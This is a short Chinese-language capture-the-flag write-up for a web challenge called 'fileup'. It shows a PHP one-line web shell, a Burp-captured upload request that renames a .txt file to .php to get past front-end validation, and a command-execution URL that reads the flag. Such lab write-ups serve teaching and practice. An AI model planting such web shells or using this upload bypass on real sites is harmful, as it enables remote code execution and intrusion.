## Web
### fileup
在 `2.txt` 文件中写入 php 一句话木马。
```2.txt
<?php system($_GET['cmd']);?>
```

选择 `2.txt` 上传，使用 burp 抓包，将 `2.txt`  改成 `2.php` 绕过前端验证。

payload:
```http
POST /upload.php HTTP/1.1
Host: eci-2zefomy0ikzauba54fm0.cloudeci1.ichunqiu.com
Content-Length: 210
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytmLUMzo4BSnxuEhQ
Accept: */*
Origin: http://eci-2zefomy0ikzauba54fm0.cloudeci1.ichunqiu.com
Referer: http://eci-2zefomy0ikzauba54fm0.cloudeci1.ichunqiu.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1732960958,1733317540,1733380272,1733561121
Connection: keep-alive

------WebKitFormBoundarytmLUMzo4BSnxuEhQ
Content-Disposition: form-data; name="file"; filename="2.php"
Content-Type: text/plain

  <?php system($_GET['cmd']);?>
------WebKitFormBoundarytmLUMzo4BSnxuEhQ--
```

响应文：
```
{"success":true,"message":"\u6587\u4ef6\u4e0a\u4f20\u6210\u529f","filePath":"uploads/6754e1a2b3f68_2.php"}
```

然后 rce 即可获得 flag
```
http://.../uploads/6754e1a2b3f68_2.php?cmd=cat /flag
```

```
flag{61ecb4e6-aa15-4813-ac4d-b33cd720251d}
```
